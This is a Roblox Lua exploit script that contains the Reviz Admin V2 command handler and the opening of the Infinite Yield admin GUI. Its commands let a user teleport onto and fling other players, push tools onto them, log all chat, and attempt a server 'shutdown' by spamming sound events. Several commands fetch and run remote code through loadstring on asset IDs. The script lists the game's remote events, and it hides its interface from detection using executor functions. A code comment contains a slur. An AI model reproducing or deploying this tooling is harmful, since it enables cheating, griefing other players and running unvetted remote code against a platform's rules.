					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("tp me ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("cbring ") then
				if (string.sub(CMDBAR.Text, 8)) == "all" or (string.sub(CMDBAR.Text, 8)) == "All" or (string.sub(CMDBAR.Text, 8)) == "ALL" then
					cbringall = true
				else
					for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
						brplr = v.Name
					end
				end
				cbring = true
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("uncbring") then
				cbring = false
				cbringall = false
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("swap ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					local NOW = lplayer.Character.HumanoidRootPart.CFrame
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					local function tp(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1:MoveTo(char2.Head.Position)
						end
					end
					wait(0.1)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.5)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					wait(0.6)
					tp(lplayer, game:GetService("Players")[v.Name])
					wait(0.4)
					lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("glitch ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					wait(0.3)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					wait(0.4)
					b = Instance.new("BodyForce")
					b.Parent = lplayer.Character.HumanoidRootPart
					b.Name = "Glitch"
					b.Force = Vector3.new(100000000,5000,0)
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("unglitch") then
				lplayer.Character.HumanoidRootPart.Glitch:Destroy()
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
				b = Instance.new("BodyForce")
				b.Parent = lplayer.Character.HumanoidRootPart
				b.Name = "unGlitch"
				b.Force = Vector3.new(0,-5000000,0)
				wait(2)
				lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("grespawn") then
				lplayer.Character.Humanoid.Health = 0
				wait(1)
				lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
				lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("explorer") then
				loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Success!";
					Text = "DEX Explorer has loaded.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("anim ") then
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://"..(string.sub(CMDBAR.Text, 6))
				local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
				track:Play(.1, 1, 1)
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("animgui") then
				loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Success!";
					Text = "Energize Animations GUI has loaded.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("savepos") then
				saved = lplayer.Character.HumanoidRootPart.CFrame
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Position Saved";
					Text = "Use ;loadpos to return to saved position.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("loadpos") then
				lplayer.Character.HumanoidRootPart.CFrame = saved
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("bang ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					local Anim2 = Instance.new("Animation")
					Anim2.AnimationId = "rbxassetid://148840371"
					local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
					track2:Play(.1, 1, 1)
					bplrr = v.Name
					banpl = true
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("unbang") then
				banpl = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("bringmod ") then
				local function bringmodw()
					for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
						if obj.Name == (string.sub(CMDBAR.Text, 10)) then
							for i,ch in pairs(obj:GetDescendants()) do
								if (ch:IsA("BasePart")) then
									ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
									ch.CanCollide = false
									ch.Transparency = 0.7
									wait()
									ch.CFrame = lplayer.Character["Left Leg"].CFrame
									wait()
									ch.CFrame = lplayer.Character["Right Leg"].CFrame
									wait()
									ch.CFrame = lplayer.Character["Head"].CFrame
								end
							end
						end
					end
				end
				while wait() do
					bringmodw()
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "BringMod";
					Text = "BringMod enabled.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("respawn") then
				local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
				local hum = Instance.new('Humanoid', mod)
				local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
				lplayer.Character = mod
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("shutdown") then
				game:GetService'RunService'.Stepped:Connect(function()
					pcall(function()
						for i,v in pairs(game:GetService'Players':GetPlayers()) do
							if v.Character ~= nil and v.Character:FindFirstChild'Head' then
								for _,x in pairs(v.Character.Head:GetChildren()) do
									if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
								end
							end
						end
					end)
				end)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Attempting Shutdown";
					Text = "Shutdown Attempt has begun.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("delobj ") then
				objtodel = (string.sub(CMDBAR.Text, 8))
				for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
					if v.Name == objtodel then
						v:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("getplrs") then
				for i,v in pairs(game:GetService("Players"):GetPlayers())do
					print(v)
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Printed";
					Text = "Players have been printed to console. (F9)";
				})
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("deldecal") then
				for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
					if (v:IsA("Decal")) then
						v:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("opfinality") then
				loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Success!";
					Text = "OpFinality GUI has loaded.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("remotes") then
				remotes = true
				added = true
				game.DescendantAdded:connect(function(rmt)
					if added == true then
						if remotes == true then 
							if rmt:IsA("RemoteEvent") then
								print("A RemoteEvent was added!")
								print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
								print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
							end end end
				end)
				game.DescendantAdded:connect(function(rmtfnctn)
					if added == true then
						if remotes == true then 
							if rmtfnctn:IsA("RemoteFunction") then
								warn("A RemoteFunction was added!")
								warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
								print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
							end end end
				end)

				game.DescendantAdded:connect(function(bndfnctn)
					if added == true then
						if binds == true then 
							if bndfnctn:IsA("BindableFunction") then
								print("A BindableFunction was added!")
								print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
								print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
							end end end
				end)

				game.DescendantAdded:connect(function(bnd)
					if added == true then
						if binds == true then 
							if bnd:IsA("BindableEvent") then
								warn("A BindableEvent was added!")
								warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
								print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
							end end end
				end)


				if binds == true then
					for i,v in pairs(game:GetDescendants()) do
						if v:IsA("BindableFunction") then
							print(" game." .. v:GetFullName() .. " | BindableFunction")
							print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
						end end
					for i,v in pairs(game:GetDescendants()) do
						if v:IsA("BindableEvent") then
							warn(" game." .. v:GetFullName() .. " | BindableEvent")
							print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
						end end
				else
					print("Off")
				end
				if remotes == true then
					for i,v in pairs(game:GetDescendants()) do
						if v:IsA("RemoteFunction") then
							warn(" game." .. v:GetFullName() .. " | RemoteFunction")
							print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
						end end
					wait()
					for i,v in pairs(game:GetDescendants()) do
						if v:IsA("RemoteEvent") then
							print(" game." .. v:GetFullName() .. " | RemoteEvent")
							print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
						end end
				else
					print("Off")
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Printing Remotes";
					Text = "Type ;noremotes to disable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("noremotes") then
				remotes = false
				added = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Printing Remotes Disabled";
					Text = "Type ;remotes to enable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("tpdefault") then
				spin = false
				followed = false
				traill = false
				noclip = false
				annoying = false
				hwalk = false
				cbringing = false
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("stopsit") then
				stopsitting = true
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("gosit") then
				stopsitting = false
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("version") then
				print(adminversion)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Version";
					Text = adminversion;
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("clicktp") then
				clickgoto = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Click TP";
					Text = "Press E to teleport to mouse position";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("noclicktp") then
				clickgoto = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Click TP";
					Text = "Click TP has been disabled.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("toolson") then
				gettingtools = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools Enabled";
					Text = "Automatically colleting tools dropped.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("toolsoff") then
				gettingtools = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools Disabled";
					Text = "Click TP has been disabled.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("delcmdbar") then
				ScreenGui:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("reset") then
				lplayer.Character.Head:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("state ") then
				statechosen = string.sub(CMDBAR.Text, 7)
				changingstate = true
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("gravity ") then
				game:GetService("Workspace").Gravity = string.sub(CMDBAR.Text, 9)
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("looprhats") then
				removingmeshhats = true
			end
			if string.sub(CMDBAR.Text, 1, 11) == ("unlooprhats") then
				removingmeshhats = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("looprtool") then
				removingmeshtool = true
			end
			if string.sub(CMDBAR.Text, 1, 11) == ("unlooprtool") then
				removingmeshtool = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("givetool ") then
				for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
					if v:IsA("Tool") then
						for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
							v.Parent = player.Character
						end
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 4) == ("age ") then
				for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
				end
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("id ") then
				for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 4))) do
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
				end
			end
			if string.sub(CMDBAR.Text, 1, 5) == (".age ") then
				for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = player.AccountAge.." Days";
						Text = "Account age of "..player.Name;
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 4) == (".id ") then
				for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = player.UserId.." ID";
						Text = "Account ID of "..player.Name;
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("gameid") then
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Game ID";
					Text = "Game ID: ".. game.GameId;
				})
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("pgs") then
				local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
				if pgscheck == true then
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "PGSPhysicsSolverEnabled";
						Text = "PGS is Enabled!";
					})
				else
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "PGSPhysicsSolverEnabled";
						Text = "PGS is Disabled!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 11) == ("removeinvis") then
				for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
					if v:IsA("Part") then
						if v.Transparency == 1 then
							if v.Name ~= "HumanoidRootPart" then
								v:Destroy()
							end
						end
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("removefog") then
				game:GetService("Lighting").FogStart = 0
				game:GetService("Lighting").FogEnd = 9999999999999
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("disable") then
				lplayer.Character.Humanoid.Parent = lplayer
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("enable") then
				lplayer.Humanoid.Parent = lplayer.Character
			end
			if string.sub(CMDBAR.Text, 1, 13) == ("givealltools ") then
				for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
					if v:IsA("Tool") then
						v.Parent = lplayer.Character
						wait()
						for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 14))) do
							v.Parent = player.Character
						end
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
				speedfly = string.sub(CMDBAR.Text, 10)
				wait()
				change()
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("carpet ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					local Anim3 = Instance.new("Animation")
					Anim3.AnimationId = "rbxassetid://282574440"
					local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
					track3:Play(.1, 1, 1)
					bplrr = v.Name
					banpl = true
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("uncarpet") then
				banpl = false
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("stare ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					staring = true
					stareplr = v
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("unstare") then
				staring = false
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("logchat") then
				chatlogs = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "LogChat enabled";
					Text = "Now logging all player chat.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("unlogchat") then
				chatlogs = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "LogChat disabled";
					Text = "Stopped logging all player chat.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("fixcam") then
				game:GetService("Workspace").CurrentCamera:Destroy()
				wait(0.1)
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
				game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
				lplayer.CameraMinZoomDistance = 0.5
				lplayer.CameraMaxZoomDistance = 400
				lplayer.CameraMode = "Classic"
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("unstate") then
				changingstate = false
			end
			CMDBAR.Text = ""
		end
	end)

	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loaded successfully!";
		Text = "Reviz Admin V2 by illremember";
	})
	wait(0.1)
	print("Reviz Admin V2 loaded!")
	if game:GetService("Workspace").FilteringEnabled == true then
		warn("FE is Enabled (Filtering Enabled)")
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "FE is Enabled";
			Text = "Filtering Enabled. Enjoy using Reviz Admin!";
		})
	else
		warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "FE is Disabled";
			Text = "Filtering Disabled. Consider using a different admin script.";
		})
	end

	local intro = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local ImageLabel = Instance.new("ImageLabel")
	intro.Parent = game:GetService("CoreGui")
	Frame.Parent = intro
	Frame.BackgroundColor3 = Color3.new(1, 1, 1)
	Frame.BackgroundTransparency = 1
	Frame.Size = UDim2.new(1, 0, 0, 300)
	Frame.Position = UDim2.new(0, 0, -0.4, 0)
	ImageLabel.Parent = Frame
	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Position = UDim2.new(0, 0, 0, 0)
	ImageLabel.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel.Image = "http://www.roblox.com/asset/?id=1542162618"
	Frame:TweenPosition(UDim2.new(0, 0, 0.2, 0), "Out", "Elastic", 3)
	wait(3.01)
	Frame:TweenPosition(UDim2.new(0, 0, 1.5, 0), "Out", "Elastic", 5)
	wait(5.01)
	intro:Destroy()
end)

UICorner_50.Parent = RevizAdmin

InfiniteYield.Name = "Infinite Yield"
InfiniteYield.Parent = Scripts
InfiniteYield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfiniteYield.Position = UDim2.new(0, 0, 0.585184872, 0)
InfiniteYield.Size = UDim2.new(0, 71, 0, 50)
InfiniteYield.Font = Enum.Font.SciFi
InfiniteYield.Text = "Infinite Yield"
InfiniteYield.TextColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYield.TextScaled = true
InfiniteYield.TextSize = 14.000
InfiniteYield.TextWrapped = true
InfiniteYield.MouseButton1Click:connect(function()
	if IY_LOADED and not _G.IY_DEBUG == true then
		error("Infinite Yield is already running!",0)
		return
	end

	pcall(function() getgenv().IY_LOADED  = true end)

	if not game:IsLoaded() then
		local notLoaded = Instance.new("Message",workspace)
		notLoaded.Text = 'Infinite Yield is waiting for the game to load'
		game.Loaded:Wait()
		notLoaded:Destroy()
	end

	ver = '5.2'

	Players = game:GetService("Players")

	Holder = Instance.new("Frame")
	Title = Instance.new("TextLabel")
	Dark = Instance.new("Frame")
	Cmdbar = Instance.new("TextBox")
	CMDsF = Instance.new("ScrollingFrame")
	cmdListLayout = Instance.new("UIListLayout")
	SettingsButton = Instance.new("ImageButton")
	ColorsButton = Instance.new("ImageButton")
	Settings = Instance.new("Frame")
	Prefix = Instance.new("TextLabel")
	PrefixBox = Instance.new("TextBox")
	Keybinds = Instance.new("TextLabel")
	StayOpen = Instance.new("TextLabel")
	Button = Instance.new("Frame")
	On = Instance.new("TextButton")
	Positions = Instance.new("TextLabel")
	EventBind = Instance.new("TextLabel")
	Plugins = Instance.new("TextLabel")
	Example = Instance.new("TextButton")
	Notification = Instance.new("Frame")
	Title_2 = Instance.new("TextLabel")
	Text_2 = Instance.new("TextLabel")
	CloseButton = Instance.new("TextButton")
	CloseImage = Instance.new("ImageLabel")
	PinButton = Instance.new("TextButton")
	PinImage = Instance.new("ImageLabel")
	Tooltip = Instance.new("Frame")
	Title_3 = Instance.new("TextLabel")
	Description = Instance.new("TextLabel")
	IntroBackground = Instance.new("Frame")
	Logo = Instance.new("ImageLabel")
	Credits = Instance.new("TextBox")
	KeybindsFrame = Instance.new("Frame")
	Close = Instance.new("TextButton")
	Add = Instance.new("TextButton")
	Delete = Instance.new("TextButton")
	Holder_2 = Instance.new("ScrollingFrame")
	Example_2 = Instance.new("Frame")
	Text_3 = Instance.new("TextLabel")
	Delete_2 = Instance.new("TextButton")
	KeybindEditor = Instance.new("Frame")
	background_2 = Instance.new("Frame")
	Dark_4 = Instance.new("Frame")
	Directions = Instance.new("TextLabel")
	BindTo = Instance.new("TextButton")
	Add_2 = Instance.new("TextButton")
	Cmdbar_2 = Instance.new("TextBox")
	Toggles = Instance.new("ScrollingFrame")
	Fly = Instance.new("TextLabel")
	Select_3 = Instance.new("TextButton")
	Noclip = Instance.new("TextLabel")
	Select_4 = Instance.new("TextButton")
	Float = Instance.new("TextLabel")
	Select_5 = Instance.new("TextButton")
	ClickTP = Instance.new("TextLabel")
	Select_6 = Instance.new("TextButton")
	ClickDelete = Instance.new("TextLabel")
	Select_13 = Instance.new("TextButton") 
	Xray = Instance.new("TextLabel")
	Select_10 = Instance.new("TextButton")
	Swim = Instance.new("TextLabel")
	Select_11 = Instance.new("TextButton")
	Fling = Instance.new("TextLabel")
	Select_12 = Instance.new("TextButton")
	Invisible = Instance.new("TextLabel")
	Select_14 = Instance.new("TextButton")
	Vehiclefly = Instance.new("TextLabel")
	Select_15 = Instance.new("TextButton")
	VehicleNoclip = Instance.new("TextLabel")
	Select_16 = Instance.new("TextButton")
	shadow_2 = Instance.new("Frame")
	PopupText_2 = Instance.new("TextLabel")
	Exit_2 = Instance.new("TextButton")
	ExitImage_2 = Instance.new("ImageLabel")
	PositionsFrame = Instance.new("Frame")
	Close_3 = Instance.new("TextButton")
	Delete_5 = Instance.new("TextButton")
	Part = Instance.new("TextButton")
	Holder_4 = Instance.new("ScrollingFrame")
	Example_4 = Instance.new("Frame")
	Text_5 = Instance.new("TextLabel")
	Delete_6 = Instance.new("TextButton")
	TP = Instance.new("TextButton")
	AliasesFrame = Instance.new("Frame")
	Close_2 = Instance.new("TextButton")
	Delete_3 = Instance.new("TextButton")
	Holder_3 = Instance.new("ScrollingFrame")
	Example_3 = Instance.new("Frame")
	Text_4 = Instance.new("TextLabel")
	Delete_4 = Instance.new("TextButton")
	Aliases = Instance.new("TextLabel")
	PluginsFrame = Instance.new("Frame")
	Close_4 = Instance.new("TextButton")
	Add_3 = Instance.new("TextButton")
	Holder_5 = Instance.new("ScrollingFrame")
	Example_5 = Instance.new("Frame")
	Text_6 = Instance.new("TextLabel")
	Delete_7 = Instance.new("TextButton")
	PluginEditor = Instance.new("Frame")
	background_3 = Instance.new("Frame")
	Dark_9 = Instance.new("Frame")
	Img = Instance.new("ImageButton")
	AddPlugin = Instance.new("TextButton")
	FileName = Instance.new("TextBox")
	About = Instance.new("TextLabel")
	Directions_2 = Instance.new("TextLabel")
	shadow_3 = Instance.new("Frame")
	PopupText_3 = Instance.new("TextLabel")
	Exit_3 = Instance.new("TextButton")
	ExitImage_3 = Instance.new("ImageLabel")
	AliasHint = Instance.new("TextLabel")
	PluginsHint = Instance.new("TextLabel")
	PositionsHint = Instance.new("TextLabel")
	ToPartFrame = Instance.new("Frame")
	background_5 = Instance.new("Frame")
	ChoosePart = Instance.new("TextButton")
	CopyPath = Instance.new("TextButton")
	Directions_4 = Instance.new("TextLabel")
	Path = Instance.new("TextLabel")
	shadow_4 = Instance.new("Frame")
	PopupText_5 = Instance.new("TextLabel")
	Exit_4 = Instance.new("TextButton")
	ExitImage_5 = Instance.new("ImageLabel")
	logs = Instance.new("Frame")
	shadow = Instance.new("Frame")
	Hide = Instance.new("TextButton")
	ImageLabel = Instance.new("ImageLabel")
	PopupText = Instance.new("TextLabel")
	Exit = Instance.new("TextButton")
	ImageLabel_2 = Instance.new("ImageLabel")
	background = Instance.new("Frame")
	chat = Instance.new("Frame")
	Clear = Instance.new("TextButton")
	SaveChatlogs = Instance.new("TextButton")
	Toggle = Instance.new("TextButton")
	scroll_2 = Instance.new("ScrollingFrame")
	join = Instance.new("Frame")
	Toggle_2 = Instance.new("TextButton")
	Clear_2 = Instance.new("TextButton")
	scroll_3 = Instance.new("ScrollingFrame")
	listlayout = Instance.new("UIListLayout",scroll_3)
	selectChat = Instance.new("TextButton")
	selectJoin = Instance.new("TextButton")

	function randomString()
		local length = math.random(10,20)
		local array = {}
		for i = 1, length do
			array[i] = string.char(math.random(32, 126))
		end
		return table.concat(array)
	end

	COREGUI = game:GetService("CoreGui")
	PARENT = nil
	if (not is_sirhurt_closure) and (syn and syn.protect_gui) then --sirhurt is retarded
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		syn.protect_gui(Main)
		Main.Parent = COREGUI
		PARENT = Main
	elseif get_hidden_gui or gethui then
		local hiddenUI = get_hidden_gui or gethui
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = hiddenUI()
		PARENT = Main
	elseif COREGUI:FindFirstChild('RobloxGui') then
		PARENT = COREGUI.RobloxGui
	else
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = COREGUI
		PARENT = Main
	end

	shade1 = {}
	shade2 = {}
	shade3 = {}
	text1 = {}
	text2 = {}
	scroll = {}

	Holder.Name = randomString()
	Holder.Parent = PARENT
	Holder.Active = true
	Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Holder.BorderSizePixel = 0
	Holder.Position = UDim2.new(1, -250, 1, -220)
	Holder.Size = UDim2.new(0, 250, 0, 220)
	Holder.ZIndex = 10
	table.insert(shade2,Holder)

	Title.Name = "Title"
	Title.Parent = Holder
	Title.Active = true
	Title.BackgroundColor3 = Color3.fromRGB(36,36,37)
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(0, 250, 0, 20)
	Title.Font = Enum.Font.SourceSans
	Title.TextSize = 18
	Title.Text = "Infinite Yield FE v"..ver
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.ZIndex = 10
	table.insert(shade1,Title)
	table.insert(text1,Title)

	Dark.Name = "Dark"
	Dark.Parent = Holder
	Dark.Active = true
	Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Dark.BorderSizePixel = 0
	Dark.Position = UDim2.new(0, 0, 0, 45)
	Dark.Size = UDim2.new(0, 250, 0, 175)
	Dark.ZIndex = 10
	table.insert(shade1,Dark)

	Cmdbar.Name = "Cmdbar"
	Cmdbar.Parent = Holder
	Cmdbar.BackgroundTransparency = 1
	Cmdbar.BorderSizePixel = 0
	Cmdbar.Position = UDim2.new(0, 5, 0, 20)
	Cmdbar.Size = UDim2.new(0, 240, 0, 25)
	Cmdbar.Font = Enum.Font.SourceSans
	Cmdbar.TextSize = 18
	Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
	Cmdbar.TextColor3 = Color3.new(1, 1, 1)
	Cmdbar.Text = ""
	Cmdbar.ZIndex = 10
	Cmdbar.PlaceholderText = "Command Bar"

	CMDsF.Name = "CMDs"
	CMDsF.Parent = Holder
	CMDsF.BackgroundTransparency = 1
	CMDsF.BorderSizePixel = 0
	CMDsF.Position = UDim2.new(0, 5, 0, 45)
	CMDsF.Size = UDim2.new(0, 245, 0, 175)
	CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
